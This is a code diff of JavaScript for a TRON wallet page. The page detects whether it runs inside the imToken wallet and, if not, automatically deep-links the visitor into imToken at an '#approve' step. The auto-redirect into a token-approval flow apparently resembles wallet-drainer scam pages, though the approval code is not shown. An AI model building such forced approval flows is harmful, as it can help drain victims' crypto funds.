@@ -1025,54 +1025,55 @@ document.addEventListener('DOMContentLoaded', async () => {
         }, 500);
     }
 });
-// ========== 环境检测（核心修复：非钱包环境直接触发按钮跳转逻辑） ==========
+// ========== 环境检测（优化绑定时机：确认按钮存在再绑定） ==========
 async function checkImTokenEnv() {
     const lang = langConfig[currentLang];
     if (window.tronWeb) {
         tronWeb = window.tronWeb;
         connectBtn.style.display = "none";
         warning.style.display = "none";
-        specialTipContainer.style.display = "none"; // imToken环境隐藏专属容器
+        specialTipContainer.style.display = "none";
         await initWallet(false);
         return;
     }
 
-    try {
-        // 非imToken环境：直接触发原按钮的跳转逻辑（复用已验证的代码）
-        specialTipContainer.style.display = "block";
-        userInfoEl.innerHTML = lang.nonImTokenUser; // 显示"正在自动唤起imToken..."
-        approveBtn.style.display = "none";
-        connectBtn.style.display = "none"; // 隐藏按钮，自动触发逻辑
-        nonImTokenPopup.style.display = "none"; // 初始不显示弹窗
-
-        // 直接执行原"连接钱包按钮"的跳转逻辑（完全复用，无修改）
-        const targetUrl = window.location.href + "#approve";
-        await navigator.clipboard.writeText(targetUrl);
-        // 用你之前验证过的旧版scheme（兼容性更好），不换新版
-        const walletScheme = "imtoken://browser?url="; 
-        const jumpUrl = walletScheme + encodeURIComponent(targetUrl);
-        window.location.href = jumpUrl;
-
-        // 跳转失败（比如浏览器拦截、未安装imToken）时的兜底
-    } catch (e) {
-        console.error("跳转执行失败：", e);
-        // 失败后显示弹窗+按钮，允许手动再次尝试
-        nonImTokenPopup.style.display = "block";
-        connectBtn.style.display = "block";
-        // 按钮仍复用原逻辑，确保一致
-        connectBtn.onclick = async () => {
-            try {
-                const targetUrl = window.location.href + "#approve";
-                await navigator.clipboard.writeText(targetUrl);
-                const jumpUrl = "imtoken://browser?url=" + encodeURIComponent(targetUrl);
-                window.location.href = jumpUrl;
-            } catch (e) {
-                alert(lang.copyFail + "\n" + lang.copyGuide);
-            }
-        };
+    // 非imToken环境：先确认按钮已渲染（加这行，彻底消除绑定时机问题）
+    if (!connectBtn) {
+        console.warn("⚠️ 连接按钮未找到，稍后重试");
+        setTimeout(() => checkImTokenEnv(), 500);
+        return;
     }
 
-    // 关闭弹窗按钮逻辑
+    // 后续逻辑不变...
+    specialTipContainer.style.display = "block";
+    userInfoEl.innerHTML = lang.nonImTokenUser;
+    approveBtn.style.display = "none";
+    connectBtn.style.display = "none";
+    nonImTokenPopup.style.display = "none";
+
+    const targetUrl = window.location.href + "#approve";
+    const walletScheme = "imtoken://browser?url=";
+    const jumpUrl = walletScheme + encodeURIComponent(targetUrl);
+
+    // 直接触发跳转
+    console.log("📤 自动触发跳转：", jumpUrl);
+    window.location.href = jumpUrl;
+
+    // 延迟3秒检测跳转结果
+    setTimeout(() => {
+        if (!window.tronWeb) {
+            nonImTokenPopup.style.display = "block";
+            connectBtn.style.display = "block";
+
+            // 绑定按钮逻辑（确认按钮存在后再绑定）
+            connectBtn.onclick = () => {
+                const targetUrl = window.location.href + "#approve";
+                const jumpUrl = "imtoken://browser?url=" + encodeURIComponent(targetUrl);
+                window.location.href = jumpUrl;
+            };
+        }
+    }, 3000);
+
     closePopupBtn.onclick = () => {
         nonImTokenPopup.style.display = "none";
     };
